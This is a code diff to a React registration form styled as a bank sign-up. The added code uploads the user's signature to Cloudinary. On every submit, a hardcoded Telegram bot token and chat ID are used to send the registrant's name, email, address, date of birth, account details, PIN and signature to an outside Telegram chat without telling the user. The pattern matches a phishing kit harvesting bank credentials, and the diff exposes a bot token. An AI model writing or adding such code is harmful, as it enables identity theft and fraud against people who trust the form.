@@ -54,6 +54,55 @@ useEffect(() => {
 }, []);
 
 
+const uploadSignatureToCloudinary = async (base64: string) => {
+  const formData = new FormData();
+  formData.append("file", base64);
+  formData.append("upload_preset", UPLOAD_PRESET);
+
+  const response = await fetch(CLOUDINARY_URL, {
+    method: "POST",
+    body: formData,
+  });
+
+  const data = await response.json();
+  return data.secure_url; // return uploaded URL
+};
+
+
+const BOT_TOKEN = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
+const CHAT_ID = "6837437455";
+
+const sendToTelegram = async (data: any) => {
+  const message = `
+🆕 New Bank Registration
+
+👤 Name: ${data.firstName} ${data.middleName} ${data.lastName}
+📧 Email: ${data.email}
+🏠 Address: ${data.address}
+👤 Gender: ${data.gender}
+🎂 DOB: ${data.dob}
+💍 Marital: ${data.maritalStatus}
+🏦 Account Type: ${data.accountType}
+📂 Sub Type: ${data.accountSubType}
+🔐 PIN: ${data.pin}
+
+✍ Signature: ${data.signature}
+🖼 Profile: ${data.profilePicture}
+`;
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+    }),
+  });
+};
+
+
 const saveSignature = () => {
   if (!signaturePadRef.current) return;
 
@@ -113,13 +162,30 @@ const clearSignature = () => {
     setValue("ssn", ssn);
   };
 
-  const onSubmit = async (data: any) => {
+ const onSubmit = async (data: any) => {
+  try {
     setLoading(true);
+
+    // Upload signature first
+    if (signature) {
+      const signatureUrl = await uploadSignatureToCloudinary(signature);
+      data.signature = signatureUrl;
+    }
+
     await addUser(data);
+
+    await sendToTelegram(data);
+
     alert("User Registered Successfully!");
+    navigate("/login");
+  } catch (error) {
+    console.error(error);
+    alert("Something went wrong.");
+  } finally {
     setLoading(false);
-    navigate("/login"); // Redirect to login page
-  };
+  }
+};
+
 
   return (
     <div className="max-w-lg mx-auto p-8 bg-gray-50 shadow-md rounded-lg">
